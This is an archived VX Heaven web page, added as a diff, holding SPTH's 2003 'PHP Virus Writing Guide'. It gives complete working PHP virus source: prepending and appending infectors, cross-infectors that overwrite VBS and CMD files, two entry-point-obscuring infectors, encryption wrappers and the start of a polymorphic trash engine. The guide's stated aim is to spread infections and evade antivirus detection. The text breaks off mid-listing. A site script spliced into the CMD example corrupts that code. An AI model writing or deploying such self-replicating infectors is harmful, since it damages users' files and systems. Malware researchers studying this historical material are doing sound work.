@@ -1,0 +1,644 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title> SPTH 'PHP Virus Writing Guide' (VX heaven)</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="Author" content="SPTH"/>
+<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, SPTH,PHP Virus Writing Guide, function, number, trash, victim, newcont, vicont, string, count, file, strstr, filehandle, host, directory, spth, rand"/>
+<meta name="Description" content="PHP, abbreviate: 'Hypertext Preprocessor', is a very common script language for the world-wide-web. You're possible to do nearly everthing internet related with that language. That means, you're also able to make viruses for it. The first virus for PHP, PHP.Pirus by MaskBits/VXI, was done in October 2000, and was released in 29A#5. It was no real virus, moreover a companion. It writes to every PHP-file in the current directory a line, which let the victim run the virus. But the host doesn't contain the virus. After searching something about PHP viruses I found out that there is no high-tech PHP virus so far out, because all the virus I could find are rips of PHP.Pirus (useing the same prinzip). That was my inspiration in writing such an article. I wanted to make something totally new, and I guess I had success. I tested every source with PHP 4.3.3, and everthing worked fine. Now go on reading this and learn something about PHP viruses! :)"/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"1584cb3ba63b6bf754a72ab36e59f013504df902-1498756952-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vsp05.html"/>
+<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
+</head>
+<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
+<div class="s1">
+<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
+<div style="float: right;"><div id="plusone"></div></div>
+<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
+<div style="float: right;" class="addthis_toolbox addthis_default_style">
+<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
+<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
+<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
+</div>
+<div style="float: right;">
+<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
+<form action="/search.php" id="cse-search-box">
+<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
+<input type="hidden" name="cof" value="FORID:10"/>
+<input type="hidden" name="ie" value="UTF-8"/>
+<input type="text" name="q" size="12" value=" "/>
+<input type="submit" name="sa" value="Search"/>
+</form>
+</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
+<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
+</div>
+<div class="s2"><h1>PHP Virus Writing Guide</h1><p><a href="/lib/?lang=en&amp;author=SPTH"> SPTH</a><br/> <em><a href="/vx.php?fid=1224#f1224">29a [7]</a></em><br/> <em>October 2003</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vsp05.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=MA#vsp05">Back to index</a>] [<a href="/lib/vsp05.html#disqus_thread">Comments</a>]<br/> 
+<p><strong>Index</strong></p>
+<ol start="0">
+<li><a href="#p0">Intro Words</a></li>
+<li><a href="#p1">File infection</a>
+<ol type="a">
+<li><a href="#p1a">Prepending</a></li>
+<li><a href="#p1b">Appending</a></li>
+<li><a href="#p1c">Cross Infection</a>
+<ol type="i">
+<li><a href="#p1c1">VBS infection</a></li>
+<li><a href="#p1c2">JS infection</a></li>
+<li><a href="#p1c3">CMD infection</a></li>
+</ol></li>
+<li><a href="#p1d">Entry Point Obscuring</a>
+<ol type="i">
+<li><a href="#p1d1">Include the virus after a command</a></li>
+<li><a href="#p1d2">Useing a function of the victim</a></li>
+</ol></li>
+</ol></li>
+<li><a href="#p2">Encryption</a>
+<ol type="a">
+<li><a href="#p2a">Changing virus to ASCII</a></li>
+<li><a href="#p2b">Useing an intern decryption function</a></li>
+<li><a href="#p2c">Useing changed character string</a></li>
+</ol></li>
+<li><a href="#p3">Polymorphism</a>
+<ol type="a">
+<li><a href="#p3a">Adding Trash</a></li>
+<li><a href="#p3b">Change Variable Names</a></li>
+<li><a href="#p3c">Number Changing</a></li>
+</ol></li>
+<li><a href="#p4">Other Thoughts</a>
+<ol type="a">
+<li><a href="#p4a">Find more files</a></li>
+<li><a href="#p4b">Changing the commands</a></li>
+</ol></li>
+<li><a href="#p5">Last Words</a></li>
+</ol>
+<h2><a name="p0"></a>0) Intro Words</h2>
+<p>PHP, abbreviate: 'Hypertext Preprocessor', is a very common script language for the world-wide-web. You're possible to do nearly everthing internet related with that language. That means, you're also able to make viruses for it. The first virus for PHP, PHP.Pirus by MaskBits/VXI, was done in October 2000, and was released in 29A#5. It was no real virus, moreover a companion. It writes to every PHP-file in the current directory a line, which let the victim run the virus. But the host doesn't contain the virus. After searching something about PHP viruses I found out that there is no high-tech PHP virus so far out, because all the virus I could find are rips of PHP.Pirus (useing the same prinzip). That was my inspiration in writing such an article. I wanted to make something totally new, and I guess I had success. I tested every source with PHP 4.3.3, and everthing worked fine. Now go on reading this and learn something about PHP viruses! :)</p>
+<h2><a name="p1"></a>1) File Infection</h2>
+<p>That's maybe the most important thing, when you want to make a PHP virus, therefor I want to explain you, how you can infect files with PHP. It should be no problme to understand the examples, because I tried it to make as simple as possible. When the article was written (autumn 2003), there was no real file infector out there. The only interesting PHP virus so far is MaskBits' PHP.Pirus, which don't infect files, but use the command 'include' that the virus is executed in every PHP file in the current dir. You may think 'Why does he tell me this?". I don't know, just for fun :). Now let me explain you how to infect files.</p>
+<h3><a name="p1a"></a>a) Prepending</h3>
+<p>A prepender copies it's code infront of the victim's code, therefor it will be executed before the victim. That's the main idea of this kind of infection. But there are some other important things you have to note: To get the virus out of the file, you need any information about where the virus is. In my example the virus uses the first 391 bytes. Next important thing is, that you must not infect a file two times. What do to against that? Check, if the file if already infected. In the following example the virus searchs in the first 13 bytes (in an infected file it's this code: '&lt;?php // SPTH') if there's a 'SPTH'. If yes, the file won't be infected. OK, I think, you understood. Now let's look at the PHP Prepender Virus example:</p>
+<h4>PHP Prepender Virus Example</h4>
+<pre class="source">
+&lt;?php // SPTH
+$string=fread(fopen(__FILE__,'r'), 391);
+$curdir=opendir('.'); 
+while ($file = readdir($curdir)) 
+{ 
+  if (strstr($file, '.php'))
+  {
+    $victim=fopen($file, 'r+');
+    if (!strstr(fread($victim, 13), 'SPTH'))
+    {
+      rewind($victim);
+      fwrite($victim, $string.fread($victim, filesize($file)););
+    }
+    fclose($victim);
+  } 
+}
+closedir($curdir);
+?>
+</pre>
+<p>As this is a real easy virus, you should understand it quickly while looking at it. Now i'm going to give you the most important things the example does:</p>
+<ul>
+<li>Reading the first 391 bytes (which is exactly the virus size)</li>
+<li>Searchs for every .PHP file in the current directory</li>
+<li>If not infected, reading the victim</li>
+</ul>
+<h3><a name="p1b"></a>b) Appending</h3>
+<p>An Appender is a virus, which copies itself after the victim file. It's really easy to make one. You just have to search the last php-part (or just make a infection-mark at the begin of the virus. Then you read till the end, and you have your virus-file. The rest should clear: Search a victim, check if not infected and copy the virus-body in the end of the file. I made an exaple for that, as you migth think. The exact explanation will be in the end after the code.</p>
+<h4>PHP Appender Virus Example</h4>
+<pre class="source">
+&lt;?php // SPTH
+$string='&lt;?php // '.strstr(fread(fopen(__FILE__,'r'), filesize(__FILE__)), 'SPTH');
+$curdir=opendir('.');
+while ($file = readdir($curdir)) 
+{
+  if (strstr($file, '.php'))
+  {
+    $victim=fopen($file, 'r+');
+    if (!strstr(fread($victim, filesize($file)), 'SPTH'))
+    {
+      fwrite($victim, $string);
+    }
+    fclose($victim);
+  } 
+}
+closedir($curdir); 
+?>
+</pre>
+<p>I've already explained how the prinzip works. Now I'll explain you my example:</p>
+<ul>
+<li>Opens the infected file, and save the virus body (searching for 'SPTH', and save the rest of the file)</li>
+<li>Searchs for every php-file in the current directory.</li>
+<li>Checks is not infected (searchs for the infection mark 'SPTH' anywhere in the file. If not found: Not infected</li>
+<li>Copies the virusbody to the file</li>
+</ul>
+<h3><a name="p1c"></a>c) Cross Infection</h3>
+<p>Cross Infection means infecting more than one file extansion. That's really useful, because the virus will spread much faster. That was my inspiration in writing this. I found some nice ways how to infect other file-formats, therefor I want to show you them. The biggest problem while coding these things was, that you can't execute a .php file directly, but with an Internet Browser. Fortunatly Microsoft make it possible to open the Internet Explorer very easiely. :)</p>
+<h4><a name="p1c1"></a>i) VBS infection</h4>
+<p>It's really easy to infect a vbs-file, because the only important thing if you want to write such a cross infector is, that you don't have to use the sign [" = chr(34) ], because VisualBasicScript uses it for strings, and since our whole code is a string in the VBS-file, there would be an error. Now look at the example, and try to understand (shouldn be too difficult, because I made it very easy to read).</p>
+<h4>Cross Infector - VBS</h4>
+<pre class="source">
+&lt;?php
+$string=strtok(fread(fopen(__FILE__,'r'), filesize(__FILE__)),chr(13).chr(10));
+$vbscode='set fso=WScript.CreateObject('.chr(34).'Scripting.FileSystemObject'.chr(34).')'.chr(13).chr(10);
+$vbscode.='set shell=WScript.CreateObject('.chr(34).'WScript.Shell'.chr(34).')'.chr(13).chr(10);
+$vbscode.='set virus=fso.CreateTextFile('.chr(34).'index.htm'.chr(34).')'.chr(13).chr(10);
+while ($string &amp;&amp; $string!='?>')
+{
+  $vbscode.='virus.WriteLine('.chr(34).$string.chr(34).')'.chr(13).chr(10);
+  $string=strtok(chr(13).chr(10));
+}
+$vbscode.='virus.WriteLine('.chr(34).'?';
+$vbscode.='>'.chr(34).')'.chr(13).chr(10);
+$vbscode.='virus.Close()'.chr(13).chr(10);
+$vbscode.='shell.Run '.chr(34).'index.htm'.chr(34);
+$directory=opendir('.');
+while ($file = readdir($directory)) 
+{ 
+  if (strstr($file, '.vbs'))
+  {
+    fwrite(fopen($file, 'w'), $vbscode);
+  }
+}
+closedir($directory);
+?>
+</pre>
+<p>It should be totally easy to understand this example. Anyway, I'll give you the main ideas of the little code:</p>
+<ul>
+<li>Splits the php-code (=virus) into lines [chr(13).chr(10)]</li>
+<li>Makes a vbs code, which generates a new HTM-file containing the virus</li>
+<li>Adds every line to the VBS (as string, so it will be written to the HTM-file, which will be generated by the VBS [?!?! :D])</li>
+<li>After finishing the VBS-code, it searches for every .VBS in the current directory and overwrites it with the code, which we made before.</li>
+</ul>
+<h4><a name="p1c2"></a>ii) JS infection</h4>
+<p>Infecting a JavaScript file is nearly the same as infecting a VBS file, therefore I won't give you an example. The reason for this is, that we're using WScript in VBS and JS. The only thing you have to do is to change the 'set' to 'var', and the '.vbs' to '.js', but i guess, you know that :D. I tried it, and it worked fine.</p>
+<h4><a name="p1c3"></a>iii) CMD infection</h4>
+<p>This was the most difficult file extansion, which I made for this article. The reason is easy to explain: CMD = Batch for WinNT/00/XP = DOS. And as you know you are NOT allowed to use any '>', '&lt;' or '&amp;' in a DOS-string. But I solved the problem, as you may imagine ;). I used the characters in every string instead of the read signs. Than I had 2 more problems: The begin and the end of the PHP code, where we MUST write '&lt;' or '>'. So I thougth about that, and suddenly a idea came to my mind: I'll use a JavaScript file, to write the first and the last line to the .htm file. And since I have to use a script anyway for starting the Internet Explorer (to run the PHP-code - DOS can't open a Internet Browser), I used that file. The result of my coding is the following file :D. I'll explain the main-ideas more exactly after the source.</p>
+<h4>Cross Infector - BAT</h4>
+<pre class="source">
+&lt;?php
+$string=strtok(fread(fopen(__FILE__,'r'), filesize(__FILE__)),chr(13).chr(10));
+$string=strtok(chr(13).chr(10));
+$cmdcode='cls'.chr(13).chr(10).<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="6e492e0b0d0601">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> off'.chr(13).chr(10).'del index.html'.chr(13).chr(10);
+while ($string{0}!='?')
+{
+  $cmdcode.='echo '.$string.chr(62).chr(62).'index.html'.chr(13).chr(10);
+  $string=strtok(chr(13).chr(10));
+}
+$cmdcode.='echo var fso=WScript.CreateObject("Scripting.FileSystemObject");'.chr(62).' file.js'.chr(13).chr(10);
+$cmdcode.='echo var shell=WScript.CreateObject("WScript.Shell");'.chr(62).chr(62).' file.js'.chr(13).chr(10);
+$cmdcode.='echo all=fso.OpenTextFile("index.html").ReadAll();'.chr(62).chr(62).' file.js'.chr(13).chr(10);
+$cmdcode.='echo a=fso.OpenTextFile("index.html",2);'.chr(62).chr(62).' file.js'.chr(13).chr(10);
+$cmdcode.='echo a.Write(String.fromCharCode(60,63,112,104,112,13,10)+all+String.fromCharCode(13,10,63,62));'.chr(62).chr(62).' file.js'.chr(13).chr(10);
+$cmdcode.='echo a.Close();'.chr(62).chr(62).' file.js'.chr(13).chr(10);
+$cmdcode.='echo shell.Run("index.html");'.chr(62).chr(62).' file.js'.chr(13).chr(10);
+$cmdcode.='cscript file.js';
+
+$directory=opendir('.');
+while ($file = readdir($directory))
+{ 
+  if (strstr($file, '.cmd'))
+  {
+    fwrite(fopen($file, 'w'), $cmdcode);
+  }
+}
+closedir($directory);
+?>
+</pre>
+<p>Now the shourt explanation of the code:</p>
+<ul>
+<li>Reads the whole file content (the virus), and splits it to lines</li>
+<li>Makes the .CMD code, which don't contain any '>','&lt;' and '&amp;' (that was the problem I wrote before)</li>
+<li>Adds a JavaScript code to the .CMD code, so the first and the last lines ('&lt;?php' and '?>') will be added to the new .htm file.</li>
+<li>Adds a code to the .CMD code, which runs the indernet-explorer</li>
+<li>Overwrites every .CMD file in the current directory with the CMD-code.</li>
+</ul>
+<h3><a name="p1d"></a>d) Entry Point Obscuring</h3>
+<p>This is a really important technique in virus-writing. Maybe some of you don't know, what EPO exactly is. So I'll explain you: An AV-program searchs in most cases at some static offsets for the virus (maybe at the begin or at the begin). To fake them, we have to use a variable adress of the virus, and don't use any jump or call to the virus at a static adress. How could we do this? I'll show you a short 'grafic'. At this point I want to thank SnakeByte for his Perl-EPO article [released in 29a#6] for the idea, how to make a EPO virus in a script language. So, here is the grafic:</p>
+<pre class="source">
+        [ part of the victim file ]
+        information about the address
+        read xxx lines of the virus
+        open PHP file
+            read yyy lines
+            insert the virus
+            read rest
+        close PHP file
+        [ rest of the victim file ]
+</pre>
+<p>Now we have another problem: Where to include the virus-code in the host-file? SnakeByte did it searching for ';', which is the end of a Perl command. As you meigth know, also PHP statments ends with a ';'. Than I thought about an other way, which could be also done, since that technique could be destruction of the victim-file. Than i got an idea: including the code to an function. how i exactly mean this, I'll show you after the ';'-example.</p>
+<h4><a name="p1d1"></a>i) Include the virus after a command</h4>
+<p>As I already told you, this idea comes from SnakeByte. To include a virus after a command, you have to search for a ';', which is the end of every PHP statement. That seems to be everything. Now let's have a look at the example for this EPO technique.</p>
+<h4>EPO virus - Type I</h4>
+<pre class="source">
+&lt;?php
+$ln=16;
+$filehandle=fopen(__FILE__,'r');
+srand((double)microtime()*1000000);
+fseek($filehandle, $ln);
+$content=fread($filehandle, 987);
+fclose($filehandle);
+$curdir=opendir('.');
+while ($file = readdir($curdir)) 
+{
+  if (strstr($file, '.php'))
+  {
+    $victim=fopen($file, 'r+');
+    $vicont=fread($victim, filesize($file));
+    if (!strstr($vicont, 'SPTH'))
+    {
+      $possible=0; $c=0;
+      while($c&lt;filesize($file))
+      {
+        if($vicont{$c}.$vicont{$c+1}.$vicont{$c+2}==chr(59).chr(13).chr(10)) { $possible++;}
+        $c++;
+      }
+      $which=rand(1,$possible); $c=0; $i=0;
+      while($which)
+      {
+        if($vicont{$c}.$vicont{$c+1}.$vicont{$c+2}==chr(59).chr(13).chr(10)) { $which--; }
+        $c++;
+      }
+      rewind($victim);
+      $a=fread($victim, $c); $b=fread($victim, filesize($file));
+      fclose($victim);
+      fwrite(fopen($file, 'w'), $a.chr(13).chr(10).'$ln='.$c.';'.chr(13).chr(10).$content.chr(13).chr(10).$b);
+    }
+  }
+}
+?>
+</pre>
+<p>This is an example for the EPO technique, which I descript above. It's quite easy to understand, anyway, I'll tell you how the virus works exactly:</p>
+<ul>
+<li>Searchs itself in the host file and reads the next 987 bytes.</li>
+<li>Opens a .php file</li>
+<li>Checks how many possible entry points the virus has</li>
+<li>Find one Entry Point randomly</li>
+<li>Reads the code before the EP and the code after it</li>
+<li>Writes the code before, the virus code and the code after the entry Point to the file</li>
+</ul>
+<h4><a name="p1d2"></a>ii) Using a function of the victim</h4>
+<p>This technique is maybe little bit better than the other one. But in fact I've seen this type of EPO in any script virus (ok, I haven't seen really many EPO script viruses :D). I've already told you, that the virus will use a function by the host file. But maybe you don't really understand, what I mean, therefore I'll show you, what I mean. Here you can see a non-infected file and an infected file. Hope that help you to get the point of the idea:</p>
+<pre class="source">
+            Normal File:                   Infected File:
+            _________________________      _________________________
+           |       HOST-CODE-1       |    |        HOST-CODE-1      |
+           |    call to function()   |    |    call to function()   |
+           |       HOST-CODE-2       |    |        HOST-CODE-2      |
+           |        function()       |    |        function()       |
+           |       HOST CODE-3       |    |      &lt; &lt; VIRUS > >      |
+           |     end  function       |    |   call to real funtion  |
+           |       HOST-CODE-4       |    |      end  function      |
+           |_________________________|    |        HOST-CODE-4      |
+                                          |      real function      |
+                                          |        HOST CODE-3      |
+                                          |     end real function   |
+                                          |_________________________|
+</pre>
+<p> Now you should understand, what I mean, but how to manage this? First you have to search for every function in the code than you use on of them, save the victim's function code and copy the virus code to the function. After the virus code you need a call to a real function, which you can add in the end of the file. The name of the real function is no problem, since your code call it. Now I also made an exaple for this technique, as you may imagine. Look at it, and try to understand. The techniqual description will follow after the code:</p>
+<h4>EPO virus - Type II</h4>
+<pre class="source">
+&lt;?php
+$ln=16;
+$filehandle=fopen(__FILE__,'r');
+srand((double)microtime()*1000000);
+fseek($filehandle, $ln);
+$content=fread($filehandle, 1611);
+fclose($filehandle);
+$curdir=opendir('.');
+while ($file = readdir($curdir)) 
+{
+  if (strstr($file, '.php'))
+  {
+    $victim=fopen($file, 'r+');
+    $vicont=fread($victim, filesize($file));
+    if (!strstr($vicont, 'SPTH'))
+    {
+      $possible=0; $viccont=$vicont;
+      while(strstr($viccont, 'function '))
+      {
+        $viccont=strstr($viccont, 'unction ');
+	$possible++; 
+      }
+      $which=rand(1,$possible);
+      $viccont=$vicont;
+      while($which--)
+      {
+        $viccont=strstr($viccont, 'function ');
+      }
+      $viccont=strstr($viccont, '{');
+      $before=strlen($vicont)-strlen($viccont)+1; $check=0; $i=0;
+      do
+      {
+        if ($viccont{$i}=='{') { $check++; }
+	if ($viccont{$i++}=='}') { $check--; }
+      }
+      while($check);
+      fseek($victim, $before);
+      $funccont=fread($victim, $i+1);
+      fseek($victim, $before+$i-1);
+      $aftercont=fread($victim, filesize($file)-$before-$i-strlen(strstr($vicont, '?>')));
+      $coundj=0; $newvar='';
+      do
+      {
+        $newvar.=chr(rand(97,122)); $countj++;
+      } 
+      while ($countj&lt;rand(5,15));
+      rewind($victim);
+      $beforecont=fread($victim, $before);
+      rewind($victim);
+      fwrite($victim, $beforecont.chr(13).chr(10).'$ln='.($before+strlen($before)+9).';'.chr(13).chr(10).$content.chr(13).chr(10).$newvar.'(); }'.$aftercont.chr(13).chr(10).'function '.$newvar.'() {'.chr(13).chr(10).$funccont.'?'.'>');
+    }
+  }
+}
+?>
+</pre>
+<p>To understand this code, you must not be a beginner. :) I worked about 4-5h at this little thing. Anyway, it works really fine and I want to tell you, how it works:</p>
+<ul>
+<li>Searchs for the virus itselfs via a variable called '$ln', which contains the information, where the virus is in the file. The variable have to be new generated every virus run, since the virus is at different places every generation. It contains the Entry Point in bytes.</li>
+<li>Searchs for a .PHP file, which are not already infected</li>
+<li>Searchs for 'function ' in the victim, to get the possible new entry points</li>
+<li>Find one Entry Point randomly</li>
+<li>Searchs for the content, which is before the founden function</li>
+<li>Searchs for the funtion-content</li>
+<li>Searchs for the content, which is after the founden function</li>
+<li>Makes a new function, with a random name, and include the function-content</li>
+<li>Writes the beginn-content, the function with the virus content, a call to the new function (which contains the real host-code), the after-content, and the new function with the whole content from the function.</li>
+</ul>
+<h2><a name="p2"></a>2) Encryption</h2>
+<p>The first part of the article should give you the idea, how to write a successful virus in PHP. But more or less, these techniques are easy to detect for Anti-Virus companies. Therefore I also want to show you, how to fake them. This (and of corse the next part: Polymorphism) of the article should help you to write a PHP virus, which can not be detected by simple string scan or just to decrease scanstrings. I found many different kinds to crypt a PHP string, and of corse, I want to tell them to you :)</p>
+<h3><a name="p2a"></a>a) Changing virus to ASCII</h3>
+<p>Using the whole virus into characters should not be a big problem. To execute the code in character I thought about 'eval()'. But after 2h of testing I saw that it don't work. So I had to think of another way: Include the virus-code (written in ASCII) to a new file, run the file via 'include()', and delete it. Therefor I made an example, which shows, how you may use the technique:</p>
+<h4>Encryption Example - Type I</h4>
+<pre class="source">
+&lt;?php
+$content=chr(60).chr(63).chr(112).chr(104).chr(112).chr(13).chr(10).chr(112).chr(114).chr(105).
+         chr(110).chr(116).chr(40).chr(34).chr(72).chr(105).chr(32).chr(86).chr(88).chr(101).
+         chr(114).chr(33).chr(32).chr(84).chr(104).chr(105).chr(115).chr(32).chr(105).chr(115).
+         chr(32).chr(106).chr(117).chr(115).chr(116).chr(32).chr(97).chr(32).chr(115).chr(105).
+         chr(108).chr(108).chr(121).chr(32).chr(116).chr(101).chr(115).chr(116).chr(32).chr(115).
+         chr(116).chr(114).chr(105).chr(110).chr(103).chr(32).chr(102).chr(111).chr(114).chr(32).
+         chr(116).chr(104).chr(101).chr(32).chr(101).chr(110).chr(99).chr(114).chr(121).chr(112).
+         chr(116).chr(105).chr(111).chr(110).chr(32).chr(105).chr(110).chr(32).chr(80).chr(72).
+         chr(80).chr(46).chr(34).chr(41).chr(59).chr(13).chr(10).chr(63).chr(62);
+copy(__FILE__,'file.php');
+$a=fopen('file.php','w+');
+fwrite($a, $content);
+fclose($a);
+include('file.php');
+unlink('file.php');
+?>
+</pre>
+<p>You should understand the prinzip of the code really fast. The encrypt code contains a 'secret' message. :) I'll show you, how it works, if you haven't understand it so far:</p>
+<ul>
+<li>'$content' contains a PHP script in ASCII form. Here you should use your virus code. Just making ASCII of the normal letters, and add them to a variable. NOTE: Since the encrypt data should be a fully workable file, you have to add '&lt;?php','?>', and the whole PHP syntax (for instands semikolons).</li>
+<li>Makes a new file (because I couldn't find a command to make a file, I copies '__FILE__', and overwrites it.</li>
+<li>Writes the encrypt content to the file (but now: unencrypt!)</li>
+<li>Opens the file (via 'include(&lt;-file->)')</li>
+<li>Deletes the file (via 'unlink(&lt;-file->)')</li>
+</ul>
+<h3><a name="p2b"></a>b) Useing an intern decryption function</h3>
+<p>This head-line sounds strange. Well, it isn't :). The basic of the idea is this one: You call a function with 3 values, and get the right sign back. The idea isn't hard to understand. I used the same prinzip as at the last example. The only differents is the encryption: Now I use a function-call instead of a real sign. But because the function calculates the right sign, and returns it, it's no problem. I hope, that you understand it. Now let's have a look at my example for this techique:</p>
+<h4>Encryption Example - Type II</h4>
+<pre class="source">
+&lt;?php
+$content=cr(-177,237,1).cr(169,106,2).cr(-135,247,1).cr(150,46,2).cr(8624,77,3).cr(56,43,2).
+         cr(1900,190,3).cr(127,15,2).cr(20,94,1).cr(51,54,1).cr(110,0,2).cr(372,256,2).
+         cr(247,207,2).cr(57,18,2).cr(-1,84,1).cr(322,221,2).cr(147,48,2).cr(232,121,2).
+         cr(7700,70,3).cr(-33,133,1).cr(-31,63,1).cr(180,97,2).cr(-106,207,1).cr(-148,247,1).
+         cr(184,70,2).cr(322,221,2).cr(-48,164,1).cr(167,135,2).cr(-71,148,1).cr(24947,247,3).
+         cr(10810,94,3).cr(202,87,2).cr(4559,47,3).cr(261,158,2).cr(312,211,2).cr(-79,111,1).
+         cr(-3,61,1).cr(-5,73,1).cr(2262,58,3).cr(56,15,2).cr(-145,204,1).cr(3289,253,3).
+         cr(225,215,2).cr(21,42,1).cr(302,240,2);
+copy(__FILE__,'file.php');
+$aa=fopen('file.php','w+');
+fwrite($aa, $content);
+fclose($aa);
+include('file.php');
+unlink('file.php');
+
+function cr($a,$b,$c)
+{
+  if ($c==1) { return(chr($a+$b)); }
+  if ($c==2) { return(chr($a-$b)); }
+  if ($c==3) { return(chr($a/$b)); }
+}
+?>
+</pre>
+<p>Well, you should have understand what I meant, when you looked at the code. I'll show you, what it does exacly. The encrypt code is a secret message again :)</p>
+<ul>
+<li>Every sign is a call to the function with 3 values. The first and the second value are the numbers, the third value is just the information, which calculation the function will have to do (+,-,/), something like the key.</li>
+<li>After getting every sign, the code will do the same as the code above.</li>
+</ul>
+<h3><a name="p2c"></a>c) Useing changed character string</h3>
+<p>This technique is a well-known one in script languages. For instands jackie did it in JavaScript. Therefore I thought that it should also be able make it in PHP. And as you can see, it was able. The technique works as follow: The (virus-) code is encrypt in a variable. It's encrypt via adding 3 (the key) to the ASCII of every character. Should be easy to understand. Now let's look at the example I made:</p>
+<h4>Encryption Example - Type III</h4>
+<pre class="source">
+&lt;?php
+$all='?Bskssulqw+*111frro/#wklv#lv#wkh#wklug#hqfu|swlrq#whfkqltxh#dqg#|rx#duh#vwloo#zlwk#ph111#=,*,>BA';
+$i=0; $content='';
+while($i&lt;strlen($all)) { $content.=chr(ord($all{$i++})-3); }
+copy(__FILE__,'file.php');
+$aa=fopen('file.php','w+');
+fwrite($aa, $content);
+fclose($aa);
+include('file.php');
+unlink('file.php');
+?>
+</pre>
+<p>The encrypt variable-content contains the code of a PHP file writing a message to the screen. The rest works as always: Makeing a new file, and overwrite them with the decrypt code, execute the file, and delete it. How the en/decryption works I'll show you:</p>
+<ul>
+<li>Changes ever character of the encrypt string to ASCII numbers (via 'ord()')</li>
+<li>Decreases the number with the key (which is 3 in this sample)</li>
+<li>Changes the number back to characters (via 'chr()'), and you got the real string.</li>
+</ul>
+<h2><a name="p3"></a>3) Polymorphism</h2>
+<p>As everybody knows, this is one of the most important techniques to fake AVs and to show, that you know, what you're doing :). So I desided also to write something about this technique here. In fact, I've never seen any other poly PHP virus around the world (maybe it exists anyway). It was really easy for me to write some poly-engines, because PHP isn't a really difficult language. I tried my best to show you, how a PHP poly engine could work.</p>
+<h3><a name="p3a"></a>a) Adding Trash</h3>
+<p>This technique is a well-known in many script languages. Therefor I tought, it should also be possible in PHP. Then I sat down, and began to write. About 2h later (with smoking-breaks, sure :D), I had the finished code. First I want to tell you, what kind of trash/junk/garbage I included in my example:</p>
+<ul>
+<li>// shsdfjksfdjfds</li>
+<li>$kasjkh=192847832;</li>
+<li>$lwekjcmws='iwsdkjhfskjbnla';</li>
+</ul>
+<p>Well, now we know, what to include. Anything else to do? Sure, we have to delete the trash again, oterhwise the file would have 2MB after the 10th time you run it, and I think, you don't want that. :) So, how to delete trash? In my example I searched the first letter of a line, and checked, if it's a '/' or a $'. If yes, it's trash and we don't have to include it to our new code. It seems I explained everthing. Now let's have a look at the code:</p>
+<h4>Adding Trash example</h4>
+<pre class="source">
+&lt;?php
+ $string=strtok(fread(fopen(__FILE__,'r'), filesize(__FILE__)),chr(13).chr(10));
+ $newcont='&lt;?php'.chr(13).chr(10);
+srand((double)microtime()*1000000);
+while ($string &amp;&amp; $string!='?>') {
+  if(rand(0,1)) {
+    if (rand(0,1)) { $newcont.='// '.trash('').chr(13).chr(10); }
+    if (rand(0,1)) { $newcont.='$'.trash('').'='.chr(39).trash('').chr(39).';'.chr(13).chr(10); }
+    if (rand(0,1)) { $newcont.='$'.trash('').'='.rand().';'.chr(13).chr(10); }
+  }
+  $string=strtok(chr(13).chr(10));
